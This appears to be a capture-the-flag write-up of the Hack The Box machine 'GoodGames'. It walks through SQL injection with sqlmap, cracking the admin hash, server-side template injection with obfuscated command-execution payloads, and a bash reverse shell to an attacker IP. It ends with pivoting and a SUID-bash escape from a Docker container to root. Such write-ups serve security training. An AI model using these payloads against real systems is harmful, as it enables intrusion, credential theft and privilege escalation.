---
title: HTB-GoodGames
draft: false
tags:
  - htb
  - linux
  - sqli
  - sqlmap
  - ssti
  - docker
  - container
  - pivoting
  - easy
---
![](https://i.imgur.com/NJNAL7r.png)

## Information Gathering
### Rustscan

Rustscan only find HTTP open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/goodgames]
└─$ rustscan --addresses 10.10.11.130 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛
<snip>
Host is up, received syn-ack (0.35s latency).
Scanned at 2024-04-10 03:49:43 EDT for 1s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
```


## Enumeration
### HTTP - TCP 80

The website shows series of games and provides blog and user account feautres:

![](https://i.imgur.com/Qesekvz.png)



#### Directory Bruteforce

I will directory bruteforce on it using feroxbuster:

`sudo feroxbuster -u http://10.10.11.130 -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![](https://i.imgur.com/rM2n9aW.png)


It finds bunch of paths but nothing seems very useful.







#### Subdomain Bruteforce

At the bottom of the page, domainname (**GoodGames.htb**) is revealed which I add to `/etc/hosts` file:

![](https://i.imgur.com/LMlovQ9.png)


I will perform subdomain enumeration using the found domain name:

`sudo gobuster vhost -u http://GoodGames.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`


![](https://i.imgur.com/0iPiHtO.png)


Unfortunately, no other subdomains are found. 


## SQLi 

Through `/login`, user can sign-in to their account:

![](https://i.imgur.com/eB0j8ct.png)


I will first intercept the log-in attempt with Burp Suite:

![](https://i.imgur.com/c2Qw7B1.png)


Testing for SQL Injection vulnerability on above request, SQLmap identifies it as vulnerable:

`sqlmap -r req.txt --dbs --batch`

![](https://i.imgur.com/vl3whk8.png)


Using the command below, I can dump the entire database and it dumps password hash for user admin and test account that I created earlier:

`sqlmap -r req.txt --dbs --batch --dump`

![](https://i.imgur.com/b5os4DF.png)


I will crack the password using crackstation and the password is **superadministrator**:

![](https://i.imgur.com/QKgeTlL.png)


### SQLi Notes


Instead of dumping the entire database, I can also specify the dump using the commands below:

`sqlmap -r req.txt -D main --tables --batch`

![](https://i.imgur.com/j02GNFt.png)


`sqlmap -r req.txt --dbs --batch -D main -t user --dump`


![](https://i.imgur.com/EmCUyEV.png)


I can also test for SQL injection:

![](https://i.imgur.com/bqbFzsi.png)



Parameter **email** is vulnerable to basic SQL injection: `OR 1=1;-- -`



## Shell as root on container
### Internal Website
Using the credentials(**admin**:**superadministrator**), I can now sign-in as administrator:

![](https://i.imgur.com/ul8yrCJ.png)


Moving to main page of the website, I see a **setting** icon on the right top corner:

![](https://i.imgur.com/bLbTcmI.png)


Clicking on the icon leads me to **internal-administration.goodgames.htb** which I add to `/etc/hosts`:

![](https://i.imgur.com/UElWlhR.png)


Luckily, using the same credentials, I can sign-in to the system:

![](https://i.imgur.com/ZkUHPcv.png)


### SSTI


#### Detection


`http://internal-administration.goodgames.htb/settings` has a feature for changing username, Brithday, and phone number:

![](https://i.imgur.com/APoq8hb.png)


Intercepting the request with Burp Suite, I can see that I can tamper data on **name=** parameter:

![](https://i.imgur.com/1Ui5707.png)


With test username **hello world** requested, web app response with **hello world**:

![](https://i.imgur.com/3nXk3UH.png)


I will try injection alert script and it seems like the web app is actually reading the script:

![](https://i.imgur.com/jIF0Q5e.png)


Now on the browser, it confirms SSTI vulnerability.

![](https://i.imgur.com/eXv2drC.png)


#### Exploitation

I will follow [this list of payloads](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt) to attempt on advanced SSTI.

Trying with `{{7*7}} = {{7*7}}` shows **49=49**:

![](https://i.imgur.com/V5lo0o3.png)


Using the command below, I can execute command `id`:

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![](https://i.imgur.com/P3Nmx7H.png)



Using the command below I can list files in current directory:

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

![](https://i.imgur.com/9FgzGBT.png)


Using the command below, I can spawn a reverse shell as **root**:

```bash
{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.9/1337 0>&1"').read()}}
```

![](https://i.imgur.com/zXdSn9l.png)


## Shell as Augustus on host

I expected the reverse shell to spawn at `/home` directory but it instead spawns at directory `/backend`

![](https://i.imgur.com/Mj7meB3.png)


Listing files and directories in `/`, I can see **.dockerenv** which implies that this shell could be on a container instead of the host:

![](https://i.imgur.com/szCxB0V.png)



**Dockerfile** seems to be a script that creates `/backend` directory and copies files from the host into it:

![](https://i.imgur.com/wPDIhiI.png)


There seems to be one user on `/home`: augustus

![](https://i.imgur.com/Lz4mbND.png)


However, on `/etc/passwd`, there is no augustus:

![](https://i.imgur.com/bVp5fjF.png)


It turns out home directory for user augustus is being mounted from the host:

`mount | grep augustus`

![](https://i.imgur.com/upjSvlm.png)


### Pivoting

Let's first discover the host IP. With `ifconfig` command, I see **eth** with IP 172.19.02:

![](https://i.imgur.com/CWoGBby.png)


Using the command below, I can ping sweep open host inside this subnet:

```bash
time for i in $(seq 1 254); do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done
```

![](https://i.imgur.com/NPdPgU8.png)


Since 172.19.0.2 is the current docker IP, 172.19.0.1 must be the host's IP.

Now using the command below, I will scan for open ports:

```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null           
```

![](https://i.imgur.com/fiQtWb0.png)


HTTP and SSH is open on the host machine and reusing the same credentials(**superadministrator**), I will try sign-in as augustus.

![](https://i.imgur.com/Fg9q3iy.png)


Above error can be simply fixed with the **script** function as such:

`script /dev/null -c bash`

![](https://i.imgur.com/APZGLhD.png)


Now I can SSH-in to host machine as augustus:

![](https://i.imgur.com/FX5hUc2.png)


## Shell as root

On the host SSH connection, I will try creating random file and see if It gets automatically updated on container enviroment:

![](https://i.imgur.com/e9CdjXN.png)


On container's connection, you can see that the file created from host is getting auto-updated:

![](https://i.imgur.com/axAa0PU.png)


I will copy `/bin/bash` to `/home/augustus`:

![](https://i.imgur.com/ceSiMxs.png)


Now I will change the owner to **root**, and set the permissions to be **SUID**:

![](https://i.imgur.com/aG20B0B.png)


Back on host's SSH connection, I can see that permissioin changed from container's root environment is applied:

![](https://i.imgur.com/cscjEOC.png)


Using `./bash -p`, I now have a shell as root:

![](https://i.imgur.com/ASKmItT.png)


## References
- https://www.hackingarticles.in/server-side-injection-explotation-bwapp/
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt